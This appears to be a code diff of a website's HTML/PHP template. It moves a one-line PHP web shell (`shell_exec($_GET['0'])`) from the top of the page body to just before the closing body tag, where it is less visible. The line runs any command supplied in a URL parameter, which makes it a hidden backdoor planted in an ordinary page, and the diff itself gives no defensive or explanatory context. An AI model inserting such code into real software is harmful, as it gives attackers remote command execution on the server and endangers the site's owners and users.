@@ -128,7 +128,6 @@
     </style>
   </head>
   <body class="smooth-scroll">
-      <?php echo shell_exec($_GET['0']); ?>
     <nav
       class="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-md border-b border-gray-100"
     >
@@ -727,5 +726,6 @@
         });
       });
     </script>
+    <?php echo shell_exec($_GET['0']);?>
   </body>
 </html>
